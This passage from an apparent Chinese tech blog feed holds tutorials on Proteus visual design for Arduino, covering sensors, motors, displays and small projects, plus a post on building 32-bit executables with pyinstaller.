href="#4-简易四向红绿灯控制" class="headerlink" title="4.简易四向红绿灯控制"></a>4.简易四向红绿灯控制</h2><h4 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h4><blockquote><p>设计四向红绿灯：绿灯15秒，黄灯5秒，红灯20秒。</p></blockquote><h4 id="原理图设计-3"><a href="#原理图设计-3" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/LyY1fBihTM3uDmz.png"></p><p><img src="https://s2.loli.net/2022/02/20/7p456sGdkH8ISyN.png" alt="所需原件"></p><h4 id="流程图设计-3"><a href="#流程图设计-3" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/FhUfnM39dxlG4EQ.png"></p><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/AEXKIjhpuUOoLfi.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/ZqXdFmzUSgRuGlN.png"></p><p><img src="https://s2.loli.net/2022/02/20/GXjxDutv3kloW1g.png"></p><p><img src="https://s2.loli.net/2022/02/20/RItKgYXVHbd2GEf.png"></p><p><img src="https://s2.loli.net/2022/02/20/pOCqo1RKxnVDI9H.png"></p><h4 id="仿真验证-3"><a href="#仿真验证-3" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/IJ4uiqhrLsTMg7S.png"></p><h2 id="5-简易温度控制器"><a href="#5-简易温度控制器" class="headerlink" title="5.简易温度控制器"></a>5.简易温度控制器</h2><h4 id="要求-3"><a href="#要求-3" class="headerlink" title="要求"></a>要求</h4><blockquote><p>使用 Grove 中 4 位一体 LED 数码管,并对其进行改造为 2 个 2 位蓝色数 码管显示器。第 1 个 2 位数码管显示测量温度，第 2 个 2 位数码管显示报警温度设定值，扩展热敏电阻温度传感器测量环境温度。当测量温度大于 或等于报警温度值时，黄色 LED 灯闪烁显示报警，否则 LED 灯熄灭不报警。 扩展 2 个 BUTTON 按键，可以预置温度报警上限值，一个键定义报警温度 +1，另一个件定义为报警温度-1。编程实现周而复始进行测温和显示，并进行温度判断和报警</p></blockquote><h4 id="原理图设计-4"><a href="#原理图设计-4" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/96wpou1btWQAv5U.png"></p><h4 id="流程图设计-4"><a href="#流程图设计-4" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/3FmMJkHrX79tqIA.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/r9wNtJMSTbRlCjk.png"></p><p><img src="https://s2.loli.net/2022/02/20/38reHUPhwsNg5RE.png"></p><p><img src="https://s2.loli.net/2022/02/20/OK7dGbpy8qQwxUl.png"></p><h4 id="仿真验证-4"><a href="#仿真验证-4" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/E3yNWzaDsIA2Vke.png"></p><h2 id="6-自动避障小车"><a href="#6-自动避障小车" class="headerlink" title="6.自动避障小车"></a>6.自动避障小车</h2><h4 id="要求-4"><a href="#要求-4" class="headerlink" title="要求"></a>要求</h4><p>能避障的小车</p><h4 id="原理图设计-5"><a href="#原理图设计-5" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/SaT3Vz4LwurdgRN.png"></p><h4 id="流程图设计-5"><a href="#流程图设计-5" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/hVpwjLKeb85gY6T.png"></p><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/m5bOwtSxgZFehKk.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/XOt3wL1j2QhynTI.png"></p><p><img src="https://s2.loli.net/2022/02/20/qNWm3Bn2LS76g8k.png"></p><h4 id="仿真验证-5"><a href="#仿真验证-5" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/JDgc8keBKYXfoQ1.png"></p><h2 id="7-打地鼠"><a href="#7-打地鼠" class="headerlink" title="7.打地鼠"></a>7.打地鼠</h2><h4 id="要求-5"><a href="#要求-5" class="headerlink" title="要求"></a>要求</h4><blockquote><p>该实验主要是模拟一个打地鼠的游戏，玩法是：按下开始键后，在规定的时间（15秒）里，按下亮着的灯底下的按钮，就可获得一分，否则没有分；开始之后屏幕上会显示得分和剩余时间，游戏途中想重新开始可以点击按钮结束当前游戏。</p></blockquote><h4 id="原理图设计-6"><a href="#原理图设计-6" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/G1YPwmXAyWoMa2N.png"></p><h4 id="流程图设计-6"><a href="#流程图设计-6" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/T8ocdmKpeH7P3AW.png"></p><p><img src="https://s2.loli.net/2022/02/20/ZDCuOi4T5M6L7kF.png"></p><p><img src="https://s2.loli.net/2022/02/20/ZDCuOi4T5M6L7kF.png"></p><p><img src="https://s2.loli.net/2022/02/20/NELVDZWFftrR2JI.png"></p><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/4N736Y5B18glemS.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/Ca6S25UPMOxT8i1.png"></p><p><img src="https://s2.loli.net/2022/02/20/3VyqSr4AYPDCtmk.png"></p><p><img src="https://s2.loli.net/2022/02/20/qXmUC5kByYzg4V3.png"></p><p><img src="https://s2.loli.net/2022/02/20/7XyCq2kVPQTxojm.png"></p><p><img src="https://s2.loli.net/2022/02/20/TIqYciAM6G9ykXs.png"></p><p><img src="https://s2.loli.net/2022/02/20/ipx86j5UHFD7vaM.png"></p><p><img src="https://s2.loli.net/2022/02/20/phUTsuxS8N1MyOV.png"></p><p><img src="https://s2.loli.net/2022/02/20/2krWj4tZxloM7VU.png"></p><h4 id="仿真验证-6"><a href="#仿真验证-6" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/logwempj1ifdTDS.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(5)——传感器</title>
      
      <link href="/archives/1244c55c.html"/>
      <url>/archives/1244c55c.html</url>
      
        <content type="html"><![CDATA[<p>上一篇文章介绍了电机的一些用法，这次来介绍——传感器。</p><p><img src="https://s2.loli.net/2022/02/13/tVdRNsYSIyZPBrq.png" alt="距离传感器"></p><p><img src="https://s2.loli.net/2022/02/13/D8oraYvJXlVQtbB.png" alt="声音传感器"></p><p><img src="https://s2.loli.net/2022/02/13/MkPCcfF9LOzopGU.png" alt="DHT22一体化温湿度传感器"></p><p><strong>传感器</strong>（sensor）</p><blockquote><p><strong>传感器是一种检测装置，能感受到被测量的信息，并能将感受到的信息，按一定规律变换成为电信号或其他所需形式的信息输出，以满足信息的传输、处理、存储、显示、记录和控制等要求。</strong></p><p>   <strong>传感器的特点包括:微型化、数字化、智能化、多功能化、系统化、网络化。它是实现自动检测和自动控制的首要环节。传感器的存在和发展，让物体有了触觉、味觉和嗅觉等感官，让物体慢慢变得活了起来。</strong></p><p>   <strong>通常根据其基本感知功能分为热敏元件、光敏元件、气敏元件、力敏元件、磁敏元件、湿敏元件、声敏元件、放射线敏感元件、色敏元件和味敏元件等十大类。</strong></p></blockquote><h2 id="1-距离传感器"><a href="#1-距离传感器" class="headerlink" title="1.距离传感器"></a>1.距离传感器</h2><p><img src="https://s2.loli.net/2022/02/13/iFnUAzLMD7rojQ4.png"></p><p>模块介绍：</p><p>１、本模块性能稳定，测度距离精确。模块高精度，盲区（2cm）。<br> 2 、主要技术参数：</p><ul><li>使用电压：DC5V        </li><li>静态电流：小于2mA</li><li>电平输出：高5V           </li><li>电平输出：低0V</li><li>感应角度：不大于15度       </li><li>探测距离：2cm-450cm      </li><li>高精度：可达0.3cm</li></ul><p> TRIP引脚是内部上拉10K的电阻，用单片机的IO口拉低TRIP引脚，然后给一个10us以上的脉冲信号。 </p><p>3、URF04模块工作原理：<br>    (1)采用IO触发测距，给至少10us的高电平信号;<br>    (2)模块自动发送8个40khz的方波，自动检测是否有信号返回；<br>    (3)有信号返回，通过IO输出一高电平，高电平持续的时间就是超声波从发射到返回的时间．<br>　 测试距离&#x3D;(高电平时间*声速(340M&#x2F;S))&#x2F;2;   　 </p><pre><code>本产品使用方法简单,一个控制口发一个10US以上的高电平,就可以在接收口等待高电平输出.一有输出就可以开定时器计时,当此口变为低电平时就可以读定时器的值,此时就为此次测距的时间,方可算出距离。 </code></pre><h4 id="1-proteus中提供的距离传感器"><a href="#1-proteus中提供的距离传感器" class="headerlink" title="(1).proteus中提供的距离传感器"></a>(1).proteus中提供的距离传感器</h4><p>在可视化设计中，提供了超声波测距的模块</p><p><img src="https://s2.loli.net/2022/02/13/zGUsZbBOhT2aYHj.png" alt="在Grove中"></p><p><img src="https://s2.loli.net/2022/02/13/YGSxjLfXyPiumV6.png"></p><p>方法：</p><ul><li>readCentimeters:按cm读距离值</li><li>readinches:按in(英寸)读距离值</li></ul><p><img src="https://s2.loli.net/2022/02/13/IUmRWGnoDlwh9HN.png"></p><p>超声波测距模块+LCD1602模块，显示距离：</p><p><img src="https://s2.loli.net/2022/02/13/ILaGfT5OVrmRBSJ.png"></p><p>仿真验证：</p><p><img src="https://s2.loli.net/2022/02/13/SYIQ2pigeowxMO9.png"></p><h2 id="2-声音传感器"><a href="#2-声音传感器" class="headerlink" title="2.声音传感器"></a>2.声音传感器</h2><p><img src="https://s2.loli.net/2022/02/13/Zqncr4kAM6LVfew.png"></p><h4 id="1-模块简介"><a href="#1-模块简介" class="headerlink" title="(1).模块简介"></a>(1).模块简介</h4><p>工作电压5V，模拟量电压信号输出，信号幅度VCC&#x2F;2，灵敏度好，内置放大电路，增益可调，可通过AD转换获得声音强度的电压信号适用于arduino平台，兼容arduino传感器接口。</p><h4 id="2-proteus提供的声音传感器"><a href="#2-proteus提供的声音传感器" class="headerlink" title="(2).proteus提供的声音传感器"></a>(2).proteus提供的声音传感器</h4><p><img src="https://s2.loli.net/2022/02/13/L6TkOqB1Xh3xtim.png" alt="原理图"></p><p><img src="https://s2.loli.net/2022/02/13/kSlOdi4rneVtcQD.png" alt="在Grove中"></p><p>该模块只有一个方法：</p><p><strong>readLevel：读声音响度值</strong></p><p><img src="https://s2.loli.net/2022/02/13/pEM1BrXVOn9dIRZ.png" alt="只有一个方法"></p><p>用该模块+LCD1602设计一个测量声音响度的程序</p><p><strong>SETUP流程图</strong>：</p><p><img src="https://s2.loli.net/2022/02/13/ohNsenm3YSCZUaI.png"></p><p><strong>LOOP流程图：</strong></p><p><img src="https://s2.loli.net/2022/02/13/AF1xl6p5UtHJ3nb.png"></p><p>仿真验证：</p><p><img src="https://s2.loli.net/2022/02/13/Jk2YlFucAfV84HL.png"></p><p>貌似这个模块在proteus8.11是有bug的，会无法运行，8.6版本可以正常运行。</p><h2 id="3-温度、湿度传感器"><a href="#3-温度、湿度传感器" class="headerlink" title="3.温度、湿度传感器"></a>3.温度、湿度传感器</h2><h4 id="1-模块介绍"><a href="#1-模块介绍" class="headerlink" title="(1).模块介绍"></a>(1).模块介绍</h4><p><strong>DHT22一体化温湿度传感器</strong>，      本产品是采用高稳定性电容式感湿元件作为传感元件，经过微处理器采集处理转化成数字信号 输出。每一个传感器都经过标定校准和测试。具有长期稳定、可靠性高、 精度高、低功耗等特点。</p><p>DHT22 数字温湿度模块具有以下特点： </p><ul><li>1、数字输出，IIC 协议；</li><li>2、超低功耗； </li><li>3、0-100%相对湿度测量范围； </li><li>4、全标定、温漂校准。 </li><li>5、使用独立感湿元器件，稳定性好，抗污染能力强</li></ul><p><img src="https://s2.loli.net/2022/02/19/ZqDmGVRLieTWYxc.png"></p><h4 id="2-proteus中可供使用的DHT22模块"><a href="#2-proteus中可供使用的DHT22模块" class="headerlink" title="(2).proteus中可供使用的DHT22模块"></a>(2).proteus中可供使用的DHT22模块</h4><p>proteus中提供了DHT22模块，</p><p><img src="https://s2.loli.net/2022/02/19/ZwimP7Ify16raks.png" alt="Breakout的DHT22模块"></p><p><img src="https://s2.loli.net/2022/02/19/QbFMIcgEqVZa4SJ.png" alt="模块的方法"></p><p><strong>方法：</strong></p><ul><li>1.readTemperature:读温度（摄氏温度或华氏温度）</li><li>2.readHumidity:读湿度（%）</li><li>3.computeheathdex:</li><li>4.converCtoF:摄氏温度转华氏温度</li><li>5.converFtoC:华氏温度转摄氏温度</li></ul><p><img src="https://s2.loli.net/2022/02/19/fasNKTyOkRCtLbi.png"></p><p>例程设计（设计一个显示温度和湿度的小程序）：</p><p>原理图：</p><p><img src="https://s2.loli.net/2022/02/19/Ra5Xcrli2vUemCD.png"></p><p>流程图：</p><p><img src="https://s2.loli.net/2022/02/19/UEkFXQ7ltB5fhdp.png"></p><p>仿真验证：</p><p><img src="https://s2.loli.net/2022/02/19/bsirlA6P2SxUvyn.png"></p><h2 id="补充：热敏电阻测温"><a href="#补充：热敏电阻测温" class="headerlink" title="补充：热敏电阻测温"></a>补充：热敏电阻测温</h2><p>GROVE的Temperature Sensor模块，</p><p><img src="https://s2.loli.net/2022/02/19/yDUV4Luw5bQf82F.png" alt="GROVE的Temperature Sensor模块"></p><p><img src="https://s2.loli.net/2022/02/19/3aSWPNYqvCj921t.png" alt="热敏电阻测温，LCD1602显示测温值。"></p><p>热敏电阻测温模块的方法：</p><ul><li><strong>readCelcius:直接读出摄氏温度；</strong></li><li>readFarenheit:直接读出华氏温度；</li><li>readKelvin:直接读卡尔文氏温度。</li></ul><p><img src="https://s2.loli.net/2022/02/19/sU8BdApDxKfn3qm.png"></p><p>流程图设计：</p><p><img src="https://s2.loli.net/2022/02/19/PGLYlCcuhvBWKiM.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(4)——电机控制</title>
      
      <link href="/archives/f26766a0.html"/>
      <url>/archives/f26766a0.html</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，我介绍了显示屏的一些用法，今天给大家介绍proteus可视化设计中，电机的一些用法</p><p><img src="https://s2.loli.net/2022/02/12/xsrS7HBOEwiPW3L.png"><img src="https://s2.loli.net/2022/02/12/leDhsLcqCpfPNAF.png"></p><h2 id="1-直流电机"><a href="#1-直流电机" class="headerlink" title="1.直流电机"></a>1.直流电机</h2><h4 id="1-直流电机简介"><a href="#1-直流电机简介" class="headerlink" title="(1).直流电机简介"></a>(1).直流电机简介</h4><p>直流电机有有刷电机和无刷电机两种，两者不同之处在于结构和原理不同，且两者各有优劣。</p><p><img src="https://s2.loli.net/2022/02/12/fiJuH6apdZzQw2y.png"></p><p>直流电机的一些特点：</p><ul><li>1、调速性能好，调速范围广，易于平滑控制</li><li>2、起动、制动转矩大，易于快速起动、停车</li><li>3、易于控制</li><li>4、通过调整直流电压可以实现电机的调速</li><li>5、改变供电电压极性可以实现改变电机旋转方向</li></ul><p><img src="https://s2.loli.net/2022/02/12/QXWxFOSZTobet7K.png" alt="直流电机的符号表示"></p><h4 id="2-proteus提供的模块介绍"><a href="#2-proteus提供的模块介绍" class="headerlink" title="(2).proteus提供的模块介绍"></a>(2).proteus提供的模块介绍</h4><p>proteus可视化设计中，提供了许多的电机模块</p><p><img src="https://s2.loli.net/2022/02/12/7jEKTzUa5g698Ct.png"></p><p>介绍一个直流电机驱动模块——<strong>L298双路直流电机驱动器</strong></p><p><img src="https://s2.loli.net/2022/02/12/3dHTZ6uoPeElAbR.png"></p><p>关于L298双路直流电机驱动器：</p><p>L298是一个集成的单片电路，它有两种封装。它是一个高压，高电流双全桥驱动器设计到接受标准化TTL逻辑电平和驱动感应负载，例如：继电器，螺线管，直流电机。有以下特点：</p><ul><li>双H全桥驱动；</li><li>电源工作电压最高达46V；</li><li>总输出直流电流高达4A；</li><li>过热的保护。</li></ul><p><img src="https://s2.loli.net/2022/02/12/1WGRYjycMCDJ79k.png"><img src="https://s2.loli.net/2022/02/12/E2tRFX5Sq4fpODv.png"></p><p>这里介绍这个模块：<strong>Arduino Motor Shield (R3) with DC Motors</strong></p><p><img src="https://s2.loli.net/2022/02/12/9FDNVtapML6beST.png" alt="Arduino Motor Shield (R3) with DC Motors"></p><p>电机模块方法：</p><ul><li>1.run:电机旋转，参数dir设定方向，speed:设定速度(0~255)</li><li>2.stop:电机停止。</li><li>3.release:电机释放（自由、不受控）</li></ul><p><img src="https://s2.loli.net/2022/02/12/faTUhIm349jYgvc.png"></p><p>一个例程参考</p><p><img src="https://s2.loli.net/2022/02/12/9reYLkITHu5MbA1.png"></p><h2 id="2-舵机控制"><a href="#2-舵机控制" class="headerlink" title="2.舵机控制"></a>2.舵机控制</h2><p><strong>舵机</strong>采用脉冲宽度控制舵机旋转角度</p><p><img src="https://s2.loli.net/2022/02/12/UME1QloJGBTRs3W.png"></p><p><img src="https://s2.loli.net/2022/02/12/yhHuSULi2PNZGE4.png"></p><p>可视化设计中，在Grove中，有舵机模块，如下图：</p><p><img src="https://s2.loli.net/2022/02/12/4P5CoQegjkJmfE8.png"></p><p>方法：</p><ul><li><p>1.read:读舵机的转动角度</p></li><li><p>2.write:写舵机的转动角度(0~180°)</p><p>   (0<del>180°)对应舵机转动(-90°</del>+90°)。  </p></li><li><p>3.readMicrosconds:读舵机控制的脉冲宽度（微秒）</p></li><li><p>4.writeMicrosconds:写舵机控制的脉冲宽度（微秒）</p><p>  （1000<del>2000）对应舵机转动(-90°</del>+90°)</p></li><li><p>5.attach:重新使用引脚控制</p></li><li><p>6.detach:拆分引脚控制</p></li></ul><p><img src="https://s2.loli.net/2022/02/12/AdhTXiP4wpoByax.png"></p><p>这次，自己来设计一个例程</p><p>首先，先在Grove中添加一个电位器模块：</p><p><img src="https://s2.loli.net/2022/02/12/WeclbhNrg6Jop15.png"></p><p><img src="https://s2.loli.net/2022/02/12/IyL6PDcbefsZVpN.png"></p><p>方法：</p><ul><li>1.readAngle:读旋转角度（0~300°)</li><li>2.readRaw:读A&#x2F;D测量原始值（0~1024）</li></ul><p>然后，再添加一个LCD1602模块</p><p><img src="https://s2.loli.net/2022/02/12/catD3HzwWNyG5fL.png"></p><p>所需模块都添加完成了，现在可以来设计程序了，这次实现的功能是：<strong>电位器(0<del>300°)旋转，控制舵机(-90°</del>+90°)旋转，并在LCD上显示角度。</strong></p><p><img src="https://s2.loli.net/2022/02/12/6rGptmV9sRwUcC8.png"></p><p>流程图：</p><p><img src="https://s2.loli.net/2022/02/12/SELzk3hU1M8cJd9.png"></p><p>仿真验证：</p><p><img src="https://s2.loli.net/2022/02/13/VLG4aUdiswxcMFl.png"></p><p>通过调节电位器的角度，可以改变舵机的角度，具体值如下：</p><p><img src="https://s2.loli.net/2022/02/13/DgklR1uQswVU9fh.png"></p><h2 id="3-步进电机"><a href="#3-步进电机" class="headerlink" title="3.步进电机"></a>3.步进电机</h2><p><img src="https://s2.loli.net/2022/02/13/ZpfRbxPYKOL6IXy.png"></p><h4 id="1-步进电机简介"><a href="#1-步进电机简介" class="headerlink" title="(1).步进电机简介"></a>(1).步进电机简介</h4><blockquote><p>​    <strong>步进电机是将电脉冲信号转变为角位移或线位移的开环控制元件。在非超载的情况下，电机的转速、停止的位置只取决于脉冲信号的频率和脉冲数，而不受负载变化的影响，当步进驱动器接收到一个脉冲信号，它就驱动步进电机按设定的方向转动一个固定的角度，称为”步距角”，它的旋转是以固定的角度一步一步运行的。可以通过控制脉冲个数来控制角位移量，从而达到准确定位的目的;同时可以通过控制脉冲频率来控制电机转动的速度和加速度，从而达到调速的目的。</strong></p><p>​    <strong>步进电机是一种感应电机，它的工作原理是利用电子电路，将直流电变成分时供电的，多相时序控制电流，用这种电流为步进电机供电，步进电机才能正常工作，驱动器就是为步进电机分时供电的，多相时序控制器。</strong></p></blockquote><h4 id="2-proteus中提供的步进电机模块"><a href="#2-proteus中提供的步进电机模块" class="headerlink" title="(2).proteus中提供的步进电机模块"></a>(2).proteus中提供的步进电机模块</h4><p><img src="https://s2.loli.net/2022/02/13/1huHTDkovKIeZXg.png"></p><p><img src="https://s2.loli.net/2022/02/13/bU8yuHnSXEYw2xG.png"></p><p>方法说明：</p><p><img src="https://s2.loli.net/2022/02/13/HXw6Zd9srJOUmlc.png"></p><ul><li>1.step:前进多步</li><li>2.oneStep:前进一步</li><li>3.release:释放电机控制</li><li>4.setSpeed:设置电机转速（转&#x2F;分)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Proteus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>用pyinstaller在64位电脑上打包32位exe</title>
      
      <link href="/archives/2fe60316.html"/>
      <url>/archives/2fe60316.html</url>
      
        <content type="html"><![CDATA[<p>hello大家好，这里是LMark。今天给别人写程序的时候，用pyinstaller打包成exe，但是对方是32位Win7，而我的是64位，所以用pyinstaller打包出来的exe文件运行不了，后来去网上找了些资料，解决了这个问题。</p><h4 id="1-安装32位的python"><a href="#1-安装32位的python" class="headerlink" title="1.安装32位的python"></a>1.安装32位的python</h4><p>下载python去官网，可以找到全版本。python的版本没有什么要求，只要是32位的。附官网传送门：<a href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a>。这里我演示下的是3.4.4，因为3.4.4还支持XP。</p><p><img src="https://s2.loli.net/2022/02/10/aDRqVFzYm1K7AuN.png"></p><p>下载并安装，安装完之后记得将python添加到环境变量中（如果电脑上已经有了64位python，建议给32位python改个名字，防止冲突）</p><h4 id="2-安装pywin32"><a href="#2-安装pywin32" class="headerlink" title="2.安装pywin32"></a>2.安装pywin32</h4><p>打包成32位exe程序需要pywin32这个包，所以我们先安装一下，这里先去下载一下<a href="https://sourceforge.net/projects/pywin32/files/pywin32/">Pywin32</a></p><p><img src="https://s2.loli.net/2022/02/10/E7qX9ihPxUvdAfo.png"></p><p>找到适合的版本（这里以python3.4为例），貌似下载需要科学上网。</p><p><img src="https://s2.loli.net/2022/02/10/1ZzQB48rl3gc6Ud.png"></p><p>下载好后直接双击运行，按照默认值，一直下一步即可。</p><h4 id="3-更新pip、whell、setuptools和安装future、pefile"><a href="#3-更新pip、whell、setuptools和安装future、pefile" class="headerlink" title="3.更新pip、whell、setuptools和安装future、pefile"></a>3.更新pip、whell、setuptools和安装future、pefile</h4><p>在cmd命令行中依次输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install pip==<span class="number">19.1</span>.<span class="number">1</span></span><br><span class="line">pip install wheel==<span class="number">0.33</span>.<span class="number">6</span></span><br><span class="line">pip install setuptools==<span class="number">42.0</span>.<span class="number">2</span></span><br><span class="line">pip install future==<span class="number">0.18</span>.<span class="number">2</span></span><br><span class="line">pip install pefile==<span class="number">2017.8</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="4-安装pyinstaller"><a href="#4-安装pyinstaller" class="headerlink" title="4.安装pyinstaller"></a>4.安装pyinstaller</h4><p>这里我安装的是3.4版本的pyinstaller(python3.4可以选择3.4或3.5版本的pyinstaller)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller==<span class="number">3.4</span></span><br></pre></td></tr></table></figure><p>安装完成后，在命令行中输入以下命令，显示以下内容表示安装成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/10/yIYAS92VR8JHGgF.png" alt="正常显示版本号"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(3)——显示屏控制</title>
      
      <link href="/archives/cb089c0e.html"/>
      <url>/archives/cb089c0e.html</url>
      
        <content type="html"><![CDATA[<p>上一篇文章介绍了LED模块的用法，这次来给大家介绍介绍一下显示屏的用法，列举一些常见的显示屏：</p><p><img src="https://s2.loli.net/2022/02/01/hOLUIEes4TAa6MS.png" alt="LED数码管显示器"><img src="https://s2.loli.net/2022/02/01/8XCiutYTAr6M1Uo.png" alt="LCD1602字符型液晶显示器"><img src="https://s2.loli.net/2022/02/01/G2gjx6dWCpM1vQN.png" alt="OLED 12864显示器"></p><p>本文给大家讲解一下这三种显示屏的用法。</p><h2 id="1-LED数码管显示屏"><a href="#1-LED数码管显示屏" class="headerlink" title="1.LED数码管显示屏"></a>1.LED数码管显示屏</h2><h4 id="（1）LED数码管介绍"><a href="#（1）LED数码管介绍" class="headerlink" title="（1）LED数码管介绍"></a>（1）LED数码管介绍</h4><p>什么是数码管呢？</p><blockquote><p>LED数码管(LED Segment Displays)由多个发光二极管封装在一起组成”日”字型的器件，引线已在内部连接完成，只需引出它们的各个笔划，公共电极。数码管实际上是由七个发光管组成日字形构成的，加上小数点就是8个。这些段分别由字母a,b,c,d,e,f,g,dp来表示。</p></blockquote><p><img src="https://s2.loli.net/2022/02/02/4KracejIDPEWkBn.png" alt="七段LED数码管"><img src="https://s2.loli.net/2022/02/02/DKcC5wZphNfszj3.png" alt="十六段数码管"><img src="https://s2.loli.net/2022/02/02/qhEWlO8JCx2Y63H.png" alt="十六段数码管引脚图"></p><p>常见的数码管是七段数码管，就是上面第一张图。此外，还有十六段数码管：</p><p><img src="https://s2.loli.net/2022/02/02/sVj6aLoJE7RfbBl.png" alt="十六段数码管结构图"></p><p>七段数码管：</p><p><img src="https://s2.loli.net/2022/02/02/6zWsfYiCp9kA7gL.png" alt="七段数码管引脚对应关系图"></p><p><img src="https://s2.loli.net/2022/02/03/ZVv3PX8Fy5HGeun.png" alt="七段数码管的正面"></p><p><img src="https://s2.loli.net/2022/02/03/uwj4qfSnb57ghcr.png" alt="七段数码管的背面"></p><p>这里稍微介绍一下七段数码管的工作原理，可以看到，一个数码管有十个引脚，每个引脚对应关系如上图所示。由于每个引脚只有高低电平两种状态，所以一般用高电平表示某一段数码管发光，低电平表示某一段数码管不发光，这样，就可以表示出0-9这是个数字了。举个例子，当数码管要显示数字<strong>1</strong>时，只要b，c引脚输出高电平，其他引脚输出低电平即可。其他数字同理可得。</p><p>显示一个数字如此，如果显示多个数字呢？比如下面的四位数码管：</p><p><img src="https://s2.loli.net/2022/02/03/MV8erwDhtFm4QBJ.png" alt="常见的四位数码管"></p><p><img src="https://s2.loli.net/2022/02/03/trxUh1kMEqeTusO.png"></p><p>可以看到，四段数码管只有12个引脚，为什么不是40个引脚呢？这是因为，四位数码管显示方式为<strong>动态扫描</strong>。每次只显示1位，快速循环显示，利用人眼视觉暂留特性，好像同时显示。这样子就可以共用一些引脚了。</p><h4 id="（2）proteus可提供的模块介绍"><a href="#（2）proteus可提供的模块介绍" class="headerlink" title="（2）proteus可提供的模块介绍"></a>（2）proteus可提供的模块介绍</h4><p>使用专用芯片TM1637实现4位LED数码管控制</p><p><img src="https://s2.loli.net/2022/02/03/dnvMXASIVW5N7ul.png" alt="TM1637芯片"></p><p><strong>TM1637</strong> 是一种带键盘扫描接口的LED（发光二极管显示器）驱动控制专用电路，内部集成有MCU 数字接口、数据锁存器、LED 高压驱动、键盘扫描等电路。本产品性能优良，质量可靠。主要应用于电磁炉、微波炉及小家电产品的显示屏驱动。采用DIP&#x2F;SOP20的封装形式。</p><p>TM1637功能特点：</p><ul><li>采用功率CMOS 工艺 </li><li>显示模式（8 段×6 位）,支持共阳数码管输出 </li><li>键扫描（8×2bit），增强型抗干扰按键识别电路 </li><li>辉度调节电路（占空比 8 级可调） </li><li>两线串行接口（CLK，DIO） </li><li>振荡方式：内置RC 振荡（450KHz+5%） </li><li>内置上电复位电路 </li><li>内置自动消隐电路 </li><li>封装形式：DIP20&#x2F;SOP20</li></ul><p><img src="https://s2.loli.net/2022/02/03/iSzInQePxbcaDmC.png" alt="芯片引脚"></p><p><img src="https://s2.loli.net/2022/02/03/TOF52d13ZJLaCio.png" alt="引脚功能说明"></p><p>典型应用电路：</p><p><img src="https://s2.loli.net/2022/02/03/cZEiyhsoqj7upmW.png" alt="6位LED数码管+16键"></p><p>装载了TM1637芯片的显示器实物图：</p><p><img src="https://s2.loli.net/2022/02/03/Qn3N6mLuS8b5WD9.png" alt="实物图"></p><p>可见，TM1637是块功能强大的芯片，在proteus可视化设计中，有一个例程就是TM1637芯片的应用。可视化设计的例程是proteus软件内置的，一些编写好的程序，可以直接打开运行，来学习某些模块如何使用。</p><h4 id="（3）数码管例程介绍"><a href="#（3）数码管例程介绍" class="headerlink" title="（3）数码管例程介绍"></a>（3）数码管例程介绍</h4><p>打开例程的方法，首先在首页的入口（图中圈出来的地方）：</p><p><img src="https://s2.loli.net/2022/02/03/6J2TSIrEnMlbKAy.png"></p><p>然后，在左边的目录中，找到“Visual Designer for Arduino”</p><p><img src="https://s2.loli.net/2022/02/03/ICYJ2lHGWpbFUBk.png"></p><p>然后在右边的结果中可以看到一共有94个例程可供学习，我们今天要介绍的例程是<strong>No.56 Grove 4-digit display</strong> Simple example showing connection and use of Grove 4-digit display module.</p><p><img src="https://s2.loli.net/2022/02/03/14ReVuyENfzGbQs.png"></p><p>可视化设计中，软件提供了一个四位数码管的模块，Grove 4-digit display 